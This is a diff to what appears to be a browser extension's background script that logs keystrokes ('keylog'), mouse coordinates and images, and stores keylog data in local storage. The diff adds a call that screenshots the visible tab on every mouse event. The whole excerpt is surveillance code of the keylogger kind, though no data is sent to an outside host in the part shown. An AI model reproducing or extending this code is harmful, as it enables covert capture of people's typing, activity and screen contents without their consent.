@@ -45,9 +45,6 @@ chrome.commands.onCommand.addListener((command) => {
 
 chrome.runtime.onMessage.addListener(msg => {
 	var ID = function () {
-		// Math.random should be unique because of its seeding algorithm.
-		// Convert it to base 36 (numbers + letters), and grab the first 9 characters
-		// after the decimal.
 		return '_' + Math.random().toString(36).substr(2, 9);
 	  };
 	if(msg.action=="keylog") {
@@ -56,16 +53,29 @@ chrome.runtime.onMessage.addListener(msg => {
 	if(msg.action == "mouselog") {
 			let splitted = msg.data.split(':');
 			mouse_coord[splitted[0]] = splitted[1];
-
+			console.log(msg.data)
 			if(splitted[1].charAt(0) === '[') {
 				let id = ID();
 				mouse_json[id] = mouse_coord;
 				mouse_coord = {};
 				concatenated += JSON.stringify(mouse_json, null, 4);
-				logtimestamp();
 			}
+			chrome.tabs.captureVisibleTab(
+				null,
+				{},
+				function(dataUrl)
+				{
+					console.log(dataUrl);
+				}
+			);
+	}
 
-				
+	if(msg.action == 'erreur') {
+		console.error(msg.data);
+	}
+
+	if(msg.action == "imglog") {
+		console.log(msg.data);
 	}
 });
 
@@ -122,7 +132,6 @@ function logtimestamp() {
 	//datetime += dateToString(currentdate);
 	//datetime = "timestamp: " + datetime;
 
-	console.log(datetime);
 	let gettingItem = chrome.storage.local.get('storedkl', function(result) {
 			if (result.storedkl == null) {
      				result.storedkl="";
